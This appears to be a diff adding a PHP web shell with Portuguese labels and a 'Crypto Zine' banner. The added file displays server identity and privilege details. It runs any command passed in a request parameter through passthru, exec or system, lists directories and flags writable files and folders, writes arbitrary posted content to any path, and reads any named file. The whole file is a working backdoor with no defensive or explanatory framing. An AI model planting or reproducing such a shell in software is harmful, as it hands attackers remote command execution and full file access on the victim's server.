@@ -1,0 +1,200 @@
+<center>
+<?php
+
+ 
+  closelog( );
+
+  $dono = get_current_user( );
+  $ver = phpversion( );
+  $login = posix_getuid( );
+  $euid = posix_geteuid( );
+  $gid = posix_getgid( );
+  if ($chdir == "") $chdir = getcwd( );
+    
+?>
+
+
+<?php
+
+  $uname = posix_uname( );
+  while (list($info, $value) = each ($uname)) {
+
+?>
+  <TR>
+    <TD width="457"><DIV STYLE="font-family: verdana; font-size: 10px;"><?= $info ?>: <?= $value ?></DIV></TD>
+  </TR>
+
+
+<?php
+  }
+?>
+<center> 
+  <TR>
+   <TR>
+    <TD><DIV STYLE="font-family: verdana; font-size: 10px;color: #ccc7777">|||Usuario Corrente|||<br> <?= $dono ?></DIV></TD>
+  </TR>
+  <TR>
+    <TD><DIV STYLE="font-family: verdana; font-size: 10px;color: #ccc7777">|||PHP|||<br> <?= $ver ?></DIV></TD>
+  </TR>
+  <TR>
+    <TD><DIV STYLE="font-family: verdana; font-size: 10px;color: #ccc7777">|||PriV|||<br> uid(<?= $login ?>) euid(<?= $euid ?>) gid(<?= $gid
+?>)</DIV></TD>
+  </TR>
+  <TR>
+    <TD><DIV STYLE="font-family: verdana; font-size: 10px;color: #ccc7777">||||Path||||<br> <?= $chdir ?></DIV></TD>
+  </TR>
+  <TR>
+    <TD><DIV STYLE="font-family: verdana; font-size: 10px;color: #ccc7777">|||ServerName|||<br><?php $aaa =  gethostbyname($SERVER_NAME); 
+echo $aaa;?></DIV></TD>
+  </TR>
+   <TR>
+    <TD><DIV STYLE="font-family: verdana; font-size: 10px;color: #f40707">|||HTTPD|||<br> <?="$SERVER_SOFTWARE $SERVER_VERSION"; ?></DIV></TD>
+  </TR>
+</TABLE>
+<BR>
+<?php
+
+  if ($cmd != "") {
+    echo "<DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b></b> </DIV>";
+
+?>
+
+<DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #f40707;">||Crypto Zine||</DIV>
+<?php
+
+if ($fe == 1){
+$fe = "exec";
+}
+if ($fe == ""){
+$fe = "passthru";
+}
+if ($fe == "2"){
+$fe = "system";
+}
+
+    if (isset($chdir)) @chdir($chdir);
+
+    ob_start( );
+      $fe("$cmd  2>&1");
+      $output = ob_get_contents();
+    ob_end_clean( );
+
+?>
+<TEXTAREA COLS="75" ROWS="8" STYLE="font-family: verdana; font-size: 10px;">
+<?php
+
+    if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
+?>
+</TEXTAREA>
+<BR>
+<?php
+
+  }
+ 
+  if ($listar != "") {
+    echo "<DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b></b> </DIV>";
+
+?>
+<DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #f40707;">||Crypto Zine||</DIV>
+<?php
+
+    if ($dir = @opendir($chdir)) {
+      echo "<TABLE border=1 cellspacing=1 cellpadding=0>";
+      echo "<TR>";
+      echo "<TD valign=top>";
+      echo "<b><font size=2 face=arial>Arquivos</b> <br><br>";
+      while (($file = readdir($dir)) !== false) {
+        if (@is_file($file)) {
+          $file1 = fileowner($file);
+          $file2 = fileperms($file);
+    	  echo "<font color=green>$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&oia=$file>$file</a><br>"; 
+	  // echo "<font color=green>$file1 - $file2 - $file </font><br>";
+          flush( );
+        }
+      }
+
+      echo "</TD>";
+      echo"<TD valign=top>";
+      echo "<b><font size=2 face=arial>Pastas</b> <br><br>";
+      if ($dir = @opendir($chdir)) {
+        while (($file = readdir($dir)) !== false) {
+          if (@is_dir($file)) {
+            $file1 = fileowner($file);
+            $file2 = fileperms($file);
+	    echo "<font color=blue>$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&chdir=$chdir/$file>$file</a><br>"; 
+            // echo "<font color=blue>$file1 - $file2 - $file </font><br>";
+          }
+        }
+      }
+      echo "</TD>";
+      echo"<TD valign=top>";
+      echo "<b><font size=2 face=arial>Pastas Alteraveis</b><br><br>";
+      if ($dir = @opendir($chdir)) {
+        while (($file = readdir($dir)) !== false) {
+          if (@is_writable($file) && @is_dir($file)) {
+
+            $file1 = fileowner($file);
+            $file2 = fileperms($file);
+            echo "<font color=red>$file1 - $file2 - $file </font><br>";
+          }
+        }
+      }
+      echo "</TD>";
+      echo "</TD>";
+      echo "<TD valign=top>";
+      echo "<b><font size=2 face=arial>Arquivos Alteraveis</b> <br><br>";
+ 
+      if ($dir = opendir($chdir)) {
+        while (($file = readdir($dir)) !== false) {
+          if (@is_writable($file) && @is_file($file)) {
+            $file1 = fileowner($file);
+            $file2 = fileperms($file);
+    	    echo "<font color=red>$file1 - $file2 - $file </font><br>";
+          }
+        }
+      }
+      echo "</TD>";
+      echo "</TR>";
+      echo "</TABLE>";
+    }
+  }
+
+?>
+
+<html>
+<body>
+<form action=<?php echo $PHP_SELF; ?> method=post>
+<input type=text name=codigo value="Codigo">
+<input type=text name=caminho value="Caminho">
+<br>
+<input type=submit value=Send>
+<br>
+</body>
+</html>
+
+<?php
+
+
+$codigo="$_POST[codigo]";
+$caminho="$_POST[caminho]";
+$fp = fopen("$caminho", "w");
+    $ok = fwrite($fp, $codigo);
+
+
+
+
+if ($oia != "") {
+  $fp = fopen($oia, "r"); 
+  $read = fread($fp, 30000); 
+  echo "$oia<br>";
+  echo "<textarea name=textarea cols=80 rows=15>"; 
+  echo "$read"; 
+  Echo "</textarea>"; 
+}
+?>
+
+
+
+
+
+
